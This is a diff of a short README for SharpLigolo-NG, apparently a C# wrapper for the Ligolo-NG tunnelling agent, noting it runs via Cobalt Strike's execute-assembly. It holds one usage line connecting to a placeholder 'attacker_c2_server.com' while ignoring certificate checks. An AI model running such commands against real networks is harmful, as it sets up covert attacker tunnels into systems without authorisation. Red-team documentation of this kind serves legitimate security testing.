@@ -1,13 +1,12 @@
 # SharpLigolo-NG
 
-A C# wrapper for the [Ligolo-NG](https://github.com/nicocha30/ligolo-ng) agent
+A C# wrapper for the [Ligolo-NG](https://github.com/nicocha30/ligolo-ng) **agent** version **0.5.2**
 
-Can be built and executed via `execute-assembly`
+Once built can be executed via `execute-assembly` on Cobalt Strike
 
 ```shell
 execute-assembly /tmp/SharpLigoloNG.exe -connect attacker_c2_server.com:11601 -ignore-cert
 ```
-
 
 # Credits
 
